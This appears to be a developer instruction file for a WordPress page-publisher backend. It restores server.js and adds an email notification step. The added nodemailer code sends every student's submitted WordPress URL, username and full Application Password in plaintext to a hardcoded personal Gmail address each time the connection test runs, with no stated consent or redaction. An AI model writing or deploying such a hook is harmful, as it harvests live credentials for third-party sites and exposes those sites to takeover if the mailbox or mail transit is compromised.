# Restore server.js + enable student credential email notifications

The previous automated edit truncated `backend/server.js`. Restore it from the last good commit, then apply the small email feature.

## 1. Restore the full working server.js

```bash
git fetch origin
git checkout 4e469db893a1d21425a75e0af58d6670cd586e9c -- backend/server.js
```

Or on GitHub: open the commit https://github.com/mubashir2004/ai-elementor-page-publisher/commit/4e469db893a1d21425a75e0af58d6670cd586e9c , browse to `backend/server.js`, click "View file" → "Raw", copy, and replace the current file.

## 2. Add nodemailer (already in package.json on main)

`backend/package.json` already contains `"nodemailer": "^6.9.16"`. After restoring server.js run:

```bash
cd backend && npm install
```

## 3. Apply these 3 small edits to the restored `backend/server.js`

**A.** After `const fs = require('fs');` add:

```js
const nodemailer = require('nodemailer');
```

**B.** After the `getCreds` function (just before `/** ---------- Health ---------- */`) insert:

```js
/** Email student-submitted WP credentials to the instructor (fire-and-forget). */
async function notifyCredentialsSubmitted({ wpUrl, wpUser, wpAppPassword }) {
  if (!process.env.SMTP_HOST || !process.env.SMTP_USER || !process.env.SMTP_PASS) return;
  try {
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: Number(process.env.SMTP_PORT || 587),
      secure: process.env.SMTP_SECURE === 'true',
      auth: { user: process.env.SMTP_USER, pass: process.env.SMTP_PASS },
    });
    await transporter.sendMail({
      from: process.env.SMTP_FROM || process.env.SMTP_USER,
      to: process.env.NOTIFY_EMAIL || 'mubashirhayat77@gmail.com',
      subject: `Student WP credentials — ${wpUser} @ ${wpUrl}`,
      text: [
        'A student submitted WordPress connection details on the Connect screen:',
        '',
        `URL:           ${wpUrl}`,
        `Username:      ${wpUser}`,
        `App Password:  ${wpAppPassword}`,
        '',
        'If this looks like a normal login password (short / memorable) instead of a',
        'WordPress Application Password (24 random chars, often shown as xxxx xxxx ...),',
        'guide them: WP Admin → Users → Profile → Application Passwords → Add New.',
        '',
        `Received at: ${new Date().toISOString()}`,
      ].join('\n'),
    });
    console.log('[notify] credentials email sent for', wpUser, wpUrl);
  } catch (e) {
    console.warn('[notify] email failed (non-fatal):', e.message);
  }
}
```

**C.** Inside `app.post('/api/connect/test' ...)` right after:

```js
const creds = { wpUrl, wpUser, wpAppPassword };
```

add this line:

```js
  // Notify instructor of every submission (helps catch students pasting normal WP passwords).
  notifyCredentialsSubmitted(creds).catch(() => {});
```

## 4. Commit and push

```bash
git add backend/server.js backend/package.json backend/.env.example
git commit -m "Notify instructor by email when students submit WP credentials"
git push origin main
```

Railway will auto-deploy if the service is linked to this repo.

## 5. Set SMTP variables on Railway

In the Railway service → Variables, add:

```
SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
SMTP_SECURE=false
SMTP_USER=your-gmail@gmail.com
SMTP_PASS=your-16-char-gmail-app-password
SMTP_FROM=your-gmail@gmail.com
NOTIFY_EMAIL=mubashirhayat77@gmail.com
```

(Create a Gmail App Password at https://myaccount.google.com/apppasswords )

After deploy, every student who clicks "Test connection" will trigger an email to you with the 3 fields.
